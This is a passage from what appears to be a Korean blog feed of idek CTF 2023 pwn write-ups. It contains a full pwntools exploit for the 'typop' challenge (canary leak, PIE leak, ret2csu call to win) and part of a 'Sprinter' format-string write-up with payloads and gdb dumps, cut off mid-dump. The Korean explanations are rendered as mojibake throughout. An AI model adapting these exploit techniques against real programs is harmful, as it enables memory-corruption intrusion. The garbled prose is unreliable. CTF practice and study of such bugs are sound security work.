<code>rbx</code>ë¥¼ 0ìœ¼ë¡œ ì„¸íŒ…í•  ê²ƒì´ê¸° ë•Œë¬¸ì— ê²°êµ­ <code>r15</code>ì— ì €ìž¥ëœ ì£¼ì†Œê°€ í˜¸ì¶œëœë‹¤. ìš°ë¦¬ê°€ ì‹¤í–‰í•˜ê³  ì‹¶ì€ ì£¼ì†ŒëŠ” <code>win</code> í•¨ìˆ˜ ì£¼ì†Œì´ê¸° ë•Œë¬¸ì— ì–´ë”˜ê°€ì—ë‹¤ê°€ <code>win</code> í•¨ìˆ˜ ì£¼ì†Œë¥¼ ì ì–´ë†“ê³  ê·¸ ì£¼ì†Œë¥¼ <code>r15</code>ì— ë„£ì–´ì¤˜ì•¼ í•œë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(win)             <span class="comment"># stack addr</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_init)</span><br><span class="line">payload += chain(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), stack-<span class="number">0x10</span>, csu_call)</span><br></pre></td></tr></table></figure><p><code>canary</code> ë’¤ì— <code>win</code> í•¨ìˆ˜ ì£¼ì†Œë¥¼ ë„£ì–´ì¤¬ë‹¤. ì‚¬ì „ì— stack ì£¼ì†Œë¥¼ êµ¬í•´ë†¨ìœ¼ë‹ˆ <code>win</code>í•¨ìˆ˜ê°€ ì €ìž¥ë˜ì–´ ìžˆëŠ” stack ì£¼ì†Œë¥¼ êµ¬í•  ìˆ˜ ìžˆë‹¤. íŽ˜ì´ë¡œë“œ ê¸€ìž ìˆ˜ë„ ë¬¸ì œì—ì„œ ì œí•œ ê±¸ì—ˆë˜ <code>0x5a</code>ì™€ ë™ì¼í•˜ë‹¤.</p><h2 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;typop.chal.idek.team&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chain</span>(<span class="params">rdi, rsi, rdx, buf, csu_call</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#payload += b&#x27;A&#x27; * 8        # add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx (dummy)</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp (dummy)</span></span><br><span class="line">    payload += p64(rdi)         <span class="comment"># pop r12 -&gt; rdi</span></span><br><span class="line">    payload += p64(rsi)         <span class="comment"># pop r13 -&gt; rsi</span></span><br><span class="line">    payload += p64(rdx)         <span class="comment"># pop r14 -&gt; rdx    </span></span><br><span class="line">    payload += p64(buf)         <span class="comment"># pop r15 -&gt; call [buf]</span></span><br><span class="line">    payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">10</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) canary, stack leak</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;canary: &#x27;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line">info(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + p64(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line"><span class="comment"># (2) pie base leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;C&#x27;</span>*<span class="number">7</span> + <span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">pie_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1447</span> </span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3) for csu_gadget</span></span><br><span class="line">win = pie_base + e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">csu_init = pie_base + <span class="number">0x14ca</span></span><br><span class="line">csu_call = pie_base + <span class="number">0x14b0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(win)             <span class="comment"># stack addr</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_init)</span><br><span class="line">payload += chain(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), stack-<span class="number">0x10</span>, csu_call)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;2_guess_typos_do_matter&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Sprinter (*FSB*)</title>
      <link href="/230117-idekctf2023-sprinter/"/>
      <url>/230117-idekctf2023-sprinter/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><blockquote><p>Iâ€™ve always found myself to be more of a distance runner than a sprinter, but sometimes you just have to sprint that final stretch.<br><code>nc sprinter.chal.idek.team 1337</code></p></blockquote><ul><li>[25 solves &#x2F; 489 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : âœ“ (value: 0xfe2ac7e4ac5ec700)</span><br><span class="line">NX                            : âœ“ </span><br><span class="line">PIE                           : âœ˜ </span><br><span class="line">Fortify                       : âœ˜ </span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure><p><code>canary</code>ê°€ ì¡´ìž¬í•œë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your string into my buffer, located at %p: &quot;</span>, buf);</span><br><span class="line">  fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = (<span class="type">size_t</span>)<span class="built_in">strchr</span>(buf, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x26</span> )</span><br><span class="line">      LODWORD(v0) = <span class="built_in">sprintf</span>(buf, buf); <span class="comment">// [*]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[*]</code> ì—ì„œ <code>Format String Bug</code>ê°€ í„°ì§„ë‹¤. ì•ˆíƒ€ê¹ê²Œë„ <code>n</code>ì„ í•„í„°ë§í•˜ê³ , <code>sprintf(buf, buf)</code> í˜•ì‹ìœ¼ë¡œ ë²„ê·¸ê°€ ë°œìƒí•˜ê¸° ë•Œë¬¸ì— ë¬¸ì œ í’€ê¸° êµ‰ìž¥ížˆ ê¹Œë‹¤ë¡­ë‹¤. íŽ˜ì´ë¡œë“œë¥¼ ì ì–´ë†¨ëŠ”ë° í¬ë§·ìŠ¤íŠ¸ë§ì„ ì‹¤í–‰(?)í•˜ë©´ì„œ ë‚´ê°€ ì ì–´ë†¨ë˜ íŽ˜ì´ë¡œë“œê°€ ë®íž ìˆ˜ë„ ìžˆê¸° ë•Œë¬¸ì´ë‹¤. </p><p>ë¬¸ì œë¥¼ ë³´ë©° ê°€ìž¥ ë¨¼ì € ìƒê°ì´ ë“¤ì—ˆë˜ ê²ƒì€ <code>n</code>ì´ í•„í„°ë§ ë˜ì–´ ìžˆëŠ”ë° ì–´ë–»ê²Œ overflowë¥¼ ì¼ìœ¼ì¼œì„œ ì–´ë–»ê²Œ retë¥¼ ë³€ì¡°í•˜ëŠëƒì˜€ë‹¤. ë”ìš±ì´ canaryê°€ ì¡´ìž¬í–ˆê¸° ë•Œë¬¸ì— ì´ê²ƒì„ ì–´ë–»ê²Œ ìš°íšŒí•˜ê±°ë‚˜ leakí•  ì§€ë„ ê³ ë¯¼ì´ì—ˆë‹¤. í•˜ì§€ë§Œ ì—¬ëŸ¬ê°€ì§€ í…ŒìŠ¤íŠ¸ë¥¼ ì§„í–‰í•œ ê²°ê³¼ <code>%c</code> ë“±ì„ ì´ìš©í•´ì„œ overflowë¥¼ ì‰½ê²Œ ì¼ìœ¼í‚¬ ìˆ˜ ìžˆì—ˆê³  canaryë¥¼ ë¯¸ë¦¬ êµ¬í•´ë†“ëŠ” ê³¼ì •ì´ í•„ìš”í•˜ë‹¤ê³  íŒë‹¨í–ˆë‹¤.</p><p>ì´ ë¬¸ì œê°€ ê¹Œë‹¤ë¡œìš´ ì ì´ í•œ ê°€ì§€ ë” ì¡´ìž¬í•œë‹¤. ë°”ë¡œ íŽ˜ì´ë¡œë“œì˜ ê¸¸ì´ ì œí•œì¸ë°, <code>strlen</code>ì„ ì´ìš©í•´ì„œ íŽ˜ì´ë¡œë“œì˜ ê¸¸ì´ë¥¼ êµ¬í•˜ê³  ìžˆë‹¤. </p><p>ì´ ë¬¸ì œì˜ í™˜ê²½ì€ <code>Ubuntu 20.04</code>ì´ë©° ë‹¤í–‰ížˆ ìž‘ë™í•˜ëŠ” <code>one gadget</code>ì´ ì¡´ìž¬í•œë‹¤. (ë¬¸ì œ íŒŒì¼ì— libcê°€ í•¨ê»˜ í¬í•¨ë˜ì–´ ìžˆë‹¤.)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul><li><a href="https://uz56764.tistory.com/83">https://uz56764.tistory.com/83</a></li></ul><p>ê¸°ê°„ ë‚´ì— ì´ ë¬¸ì œë¥¼ í’€ì§€ ëª»í–ˆê¸° ë•Œë¬¸ì— ìœ„ ë¸”ë¡œê·¸ë¥¼ ì°¸ê³ í•˜ì—¬ ê³µë¶€ë¥¼ ì§„í–‰í–ˆë‹¤.</p><h3 id="0-c"><a href="#0-c" class="headerlink" title="0. $[]%[]c"></a>0. <code>$[]%[]c</code></h3><p>ë»˜í•˜ê²Œ í—·ê°ˆë ¸ë˜ ê°œë…ì´ë‹¤.. ì •í™•ížˆëŠ” <code>$[offset]%[num]c</code>ìœ¼ë¡œ ì •ì˜í•˜ê³  ì‹¶ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100c\n&quot;</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ê²ƒì˜ ì¶œë ¥ ê²°ê³¼ëŠ” ë¬´ì—‡ì¼ê¹Œ? 99ë²ˆ ê³µë°±ì„ ì¶œë ¥í•˜ê³  ë§ˆì§€ë§‰ì— â€˜Aâ€™ë¥¼ ì¶œë ¥í•œë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100s\n&quot;</span>, <span class="string">&quot;AA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìžë§¤í’ˆìœ¼ë¡œ ì´ê²ƒì˜ ì¶œë ¥ ê²°ê³¼ëŠ” 98ë²ˆ ê³µë°±ì„ ì¶œë ¥í•˜ê³  ë§ˆì§€ë§‰ì— â€˜AAâ€™ë¥¼ ì¶œë ¥í•œë‹¤.</p><p><code>$[offset]</code>ì˜ ì˜ë¯¸ëŠ”.. <code>FSB</code>ì—ì„œ ë§Žì´ ë³´ë˜ ë°”ë¡œ ê·¸ê±°ë‹¤. offset ë²ˆì§¸ë¥¼ ì°¸ì¡°í•œë‹¤. ë§Œì•½ <code>%10$264c</code>ë¼ë©´ ë¨¼ì € ê³µë°± 264ê°œë¥¼ ì¶œë ¥í•˜ê³  10ë²ˆì§¸ offsetì„ ì°¸ì¡°í•œ ê°’ì„ ì¶œë ¥í•  ê²ƒì´ë‹¤.</p><h3 id="1-Canary-ë³´ì¡´"><a href="#1-Canary-ë³´ì¡´" class="headerlink" title="1. Canary ë³´ì¡´"></a>1. Canary ë³´ì¡´</h3><p>ì œì¼ ë¨¼ì € í•´ì•¼í•  ì¼ì€ <code>canary</code>ë¥¼ ë³´ì¡´í•´ì•¼í•˜ëŠ” ê²ƒì´ë‹¤. (ì–´ë–»ê²Œ ë³´ë©´ ì´ ë¬¸ì œì˜ í•µì‹¬ì´ë¼ê³ ë„ í•  ìˆ˜ ìžˆê² ë‹¤.) ê·¸ ì „ì— <code>canary</code> ì§ì „ê¹Œì§€ ë®ì–´ë³´ìž.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%10$264c&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p8(<span class="number">0x41</span>)   <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p>í•œ ë¸”ë¡ì€ 8ë°”ì´íŠ¸ì´ê¸° ë•Œë¬¸ì— íŒ¨ë”©ì„ ì €ë ‡ê²Œ ì¤˜ì•¼í•œë‹¤. ê°€ë…ì„±ì„ ìœ„í•´ ë‘ ë²ˆ ë‚˜ëˆ„ì–´ì„œ ìž‘ì„±í–ˆëŠ”ë°, 0x26ì˜ ì˜ë¯¸ëŠ” ë¬¸ì œì—ì„œ ìš”êµ¬í•œ ê¸¸ì´ ì œí•œì´ë‹¤.</p><p>payloadë¥¼ ì €ë ‡ê²Œ ìž‘ì„±í•˜ê²Œ ë˜ë©´ 10ë²ˆì§¸ offsetì„ ì°¸ê³ í•˜ì—¬ 264ë²ˆì˜ ê³µë°± ì¶œë ¥ í›„ ë§ˆì§€ë§‰ì— 0x41ì„ ì¶œë ¥í•œë‹¤. gdb ìƒì—ì„œ í™•ì¸í•´ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><ul><li><code>FSB</code> ì¼ìœ¼í‚¤ê¸° ì „</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffc4a31cb80â”‚+0x0000: &quot;%10$264c&quot;     â† $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffc4a31cb88â”‚+0x0008: 0x0000000000000000        # 6</span><br><span class="line">0x007ffc4a31cb90â”‚+0x0010: 0x0000000000000000        # 7</span><br><span class="line">0x007ffc4a31cb98â”‚+0x0018: 0x0000000000000000        # 8</span><br><span class="line">0x007ffc4a31cba0â”‚+0x0020: 0x0000000000000000        # 9</span><br><span class="line">0x007ffc4a31cba8â”‚+0x0028: 0x00034000000a41 (&quot;A\n&quot;?) # 10</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li><code>FSB</code> ì¼ìœ¼í‚¨ í›„</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc4a31cb80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cb90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cba0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbb0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbe0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc80: 0x4120202020202020      0x5207f53f7a984d00</span><br><span class="line">0x7ffc4a31cc90: 0x00007ffc4a31cca0      0x00000000004012fd</span><br></pre></td></tr></table></figure><p>ë³¸ê²©ì ìœ¼ë¡œ <code>canary</code> ë³´ì¡´ì„ ì‹œìž‘í•´ë³´ìž. <code>ret</code>ë¥¼ ë®ê¸° ìœ„í•´ì„œëŠ” í•„ìˆ˜ì ìœ¼ë¡œ <code>canary</code>ë¥¼ ê±´ë“œë ¤ì•¼ë§Œ í•œë‹¤. ìš°ë¦¬ëŠ” <code>FSB</code>ë¥¼ ì´ìš©í•˜ì—¬ <code>canary</code>ë¥¼ êµ¬í•œ ë‹¤ìŒì— ì¨ì•¼ í•œë‹¤. ì¦‰, ì•žì—ì„œ ë§í•œ <code>canary</code> ë³´ì¡´ì€ <code>canary</code>ë¥¼ leakí•œ ë‹¤ìŒ ê·¸ ìžë¦¬ì— ë‹¤ì‹œ ì¨ì•¼í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%5$264c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>   <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)     <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p><code>5ë²ˆì§¸</code> ì˜¤í”„ì…‹ì€ <code>0x25</code>ë¥¼ ì˜ë¯¸í•˜ê³  <code>4ë²ˆì§¸</code> ì˜¤í”„ì…‹ì€ <code>r9</code> ë ˆì§€ìŠ¤í„°ì¸ <code>0x00</code>ì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2563343632243525</span><br></pre></td></tr></table></figure><p><code>10ë²ˆì§¸</code> ì˜¤í”„ì…‹ì€ <code>canary_addr + 1</code>ì„ ì˜ë¯¸í•˜ëŠ”ë° <code>+1</code>ì˜ ì˜ë¯¸ëŠ” <code>canary</code>ëŠ” <code>null</code> ë°”ì´íŠ¸ë¶€í„° ì‹œìž‘í•˜ê¸° ë•Œë¬¸ì´ë‹¤. ê·¸ëž˜ì„œ <code>canary_addr + 1</code>ë¶€í„° <code>%.7s</code>ë¥¼ ì´ìš©í•˜ì—¬ 7ìžë¦¬ë§Œ ê°€ì ¸ì™”ë‹¤. ì•žì—ì„œ <code>%4$c</code>ìœ¼ë¡œ <code>null</code> ë°”ì´íŠ¸ í•œ ë°”ì´íŠ¸ë§Œ ê°€ì ¸ì™”ê¸° ë•Œë¬¸ì— <code>canary</code>ê°€ ìž˜ ë³´ì¡´ë˜ì—ˆìœ¼ë¦¬ë¼ ìƒê°ëœë‹¤. </p><p><code>%s</code>ë¥¼ ì´ìš©í•˜ì—¬ ì¹´ë‚˜ë¦¬ë¥¼ ì „ë¶€ ë‹¤ ê°€ì ¸ì˜¤ê²Œ ë˜ë©´ <code>null</code>Â ë°”ì´íŠ¸ ë•Œë¬¸ì— <code>sprint</code> í•¨ìˆ˜ë¡œ <code>canary</code> ì¶œë ¥ì„ í•˜ë‹¤ê°€ ëŠê¸´ë‹¤. ì‚¬ì‹¤ìƒ ì²« ë°”ì´íŠ¸ê°€ <code>null</code>ì´ê¸° ë•Œë¬¸ì— ì „í˜€ ì¶œë ¥ì„ í•˜ì§€ ëª»í•œë‹¤. ê·¸ëž˜ì„œ ìœ„ì™€ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì¶œë ¥ì„ í•´ì•¼í•œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402300: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402310: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402320: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402330: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402340: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402350: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402360: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402370: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402380: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402390: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023a0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023b0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023c0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023d0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023e0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023f0: 0x2520202020202020      0x92c29f2c0e8fb100</span><br><span class="line">0x7fff9a402400: 0x00007fff9a402400      